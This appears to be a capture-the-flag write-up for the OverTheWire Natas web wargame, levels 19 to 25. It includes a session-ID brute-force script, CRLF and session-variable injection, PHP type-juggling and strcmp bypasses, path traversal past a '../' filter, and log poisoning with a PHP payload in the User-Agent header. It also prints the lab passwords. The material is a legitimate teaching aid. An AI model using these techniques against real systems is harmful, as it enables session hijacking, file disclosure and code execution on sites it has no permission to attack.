So we explore the cookie `PHPSESSID` in the response with username=hoangp46&password=123456

```
POST /index.php HTTP/1.1
Host: natas19.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas19.natas.labs.overthewire.org/index.php?debug=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://natas19.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==
Connection: keep-alive
Cookie: __utma=176859643.1954634464.1645363414.1646410345.1646492867.10; __utmz=176859643.1646492867.10.6.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=3237332d686f616e67703436
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

The cookie `PHPSESSID=3237332d686f616e67703436` look like HEX format, try decode it we get `273-hoangp46` -> now we can brute-force to find the PHPSESSID of admin with payload `HEX(§640§-admin)`. This following python code `natas19.py`:

```python
import requests

url = "http://natas19.natas.labs.overthewire.org"
auth_username = "natas19"
auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

for i in range(641):
    cookie = '{}-admin'.format(i).encode().hex()
    r = requests.get(url, auth=(auth_username, auth_password), cookies={'PHPSESSID': cookie})
    if i == 0:
        request_length = len(r.content)
    if len(r.content) != request_length:
        print('admin id:', i, 'cookie:', cookie)
        break
    request_length = len(r.content)
```

```
python3 natas19.py

admin id: 281 cookie: 3238312d61646d696e
```

Using `curl` to set cookie `PHPSESSID=3238312d61646d696e`:

```shell
curl --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org --cookie "PHPSESSID=3238312d61646d696e"
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```

### natas20

```php
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>

```

When we change name to `hoang` and add parameter `?debug=1` into url, the response look like that:

```
DEBUG: MYREAD 43gs6u90l9seoufajpsn97ag44
DEBUG: Reading from /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: Read [name hoang]
DEBUG: Read []
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.

DEBUG: MYWRITE 43gs6u90l9seoufajpsn97ag44 name|s:5:"hoang";
DEBUG: Saving in /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: name => hoang
```

If we want to login as an admin, we need to set `$_SESSION["admin"]=1` in `print_credentials()` function.

Following `mywrite()` function, this function write data in `$_SESSION` into session_file, each key value pairs on one line:

```php
foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
```

Following `myread()` function, this function read data from session_file, and set key value pairs to `$_SESSION`:

```php
foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
```

The content of session_file of admin look like that:

```
name hoang
admin 1
```

We will inject payload to change name and write `admin 1` line into session_file. That is `CRLF injection` with the payload `hoang%0Aadmin%201`

Try access url: `http://natas20.natas.labs.overthewire.org/?name=hoang%0Aadmin%201&debug=1`

Refresh browser to reload `myread()` function, you can see password:

```
DEBUG: MYREAD 43gs6u90l9seoufajpsn97ag44
DEBUG: Reading from /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: Read [name hoang]
DEBUG: Read [admin 1]
DEBUG: Read []
DEBUG: Name set to hoang admin 1
You are an admin. The credentials for the next level are:

Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ

DEBUG: MYWRITE 43gs6u90l9seoufajpsn97ag44 name|s:13:"hoang admin 1";admin|s:1:"1";
DEBUG: Saving in /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
DEBUG: admin => 1
DEBUG: name => hoang admin 1
```

### natas21

```php
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?> 
```

```php
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>
<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
        $val = $_SESSION[$key];
        } 
    else {
        $_SESSION[$key] = $val;
        }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?> 
```

The application save key value pairs from `$_REQUEST` to `$_SESSION` by:

```php
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

Login as an admin required `$_SESSION["admin"] == 1` -> `$_REQUEST["admin"] == 1`

Custom input form to `<input name="admin" value="1">` -> POST -> get response with parameter `?debug`:

```
[DEBUG] Session contents:
Array ( [align] => center [fontsize] => 100% [bgcolor] => yellow [admin] => 1 [submit] => Update )
```

Oh, `[admin] => 1` is should be ok, let's see the response:

```
GET /index.php?debug HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
Connection: keep-alive
Cookie: __utma=176859643.1954634464.1645363414.1646503128.1646533829.12; __utmz=176859643.1646533829.12.8.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=2tfpv93p619l71uffvd1675uh5
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Get cookie `PHPSESSID=2tfpv93p619l71uffvd1675uh5` and POST to http://natas21.natas.labs.overthewire.org/index.php:

```shell
curl --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/index.php --cookie "PHPSESSID=2tfpv93p619l71uffvd1675uh5"
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

### natas22

```php
<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?>

<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?> 
```

In the browser, try access: http://natas22.natas.labs.overthewire.org/?revelio to get password. But it's nothing???

Because `header("Location: /");` in source code, the browser redirect to root page (/), Let's use `curl`:

```sh
curl --user natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
```

```
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

### natas23

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

In PHP, we can compare between string and int, string will be convert to int, such as: `"abc"->0`, `"123abc->123` or `"10e1xyz"->100`. So the passwd payload `123iloveyou` is should be ok.

```
The credentials for the next level are:

Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

### natas24

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?> 
```

In PHP, `strcmp` is used to compare two string. If two string equal, the `strcmp` return to 0.

We want `strcmp` return to 0. It will happen if passwd will be a string equals to which is unknown. The other case is that passwd won't be a string, the function will return `NULL` (equal 0) and raise Warning, such as below:

```
strcmp("foo", array()) => NULL + PHP Warning
strcmp("foo", new stdClass) => NULL + PHP Warning
strcmp(function(){}, "") => NULL + PHP Warning
```

Let's pass `passwd` as array with the payload `?passwd[]=`:

```
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23

The credentials for the next level are:

Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

The application allow us to change language by `setLanguage()` function.

When `setLanguage()`, the function `safeinclude()` is running to include another file.

The function `safeinclude()` replace `"../"` by `""` to avoid path traversal injection, but we can bypass by using payload `..././`.

Try access: http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././etc/passwd, we can see the response:

```
...
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync
```

The function `logRequest()` dump `$_SERVER['HTTP_USER_AGENT']` and `$message` into file `/var/www/natas/natas25/logs/natas25_{PHPSESSID}.log`. So we can inject php code into `$_SERVER['HTTP_USER_AGENT']` by custom Header User-Agent.

Explore the Cookie, we have `PHPSESSID=eaufuovudsaosoirjmihb93j66`,

Try access http://natas25.natas.labs.overthewire.org/?lang=..././logs/natas25_eaufuovudsaosoirjmihb93j66.log, we get log look like that:

```
[06.03.2022 20::19:41] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::19:46] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::20:48] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::21:21] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::22:29] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." 
```

Change `User-Agent` header to: `<?php echo file_get_contents("/etc/natas_webpass/natas26");?>`, the password of natas26 will be written to the file. See log and get password `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`.

### natas26

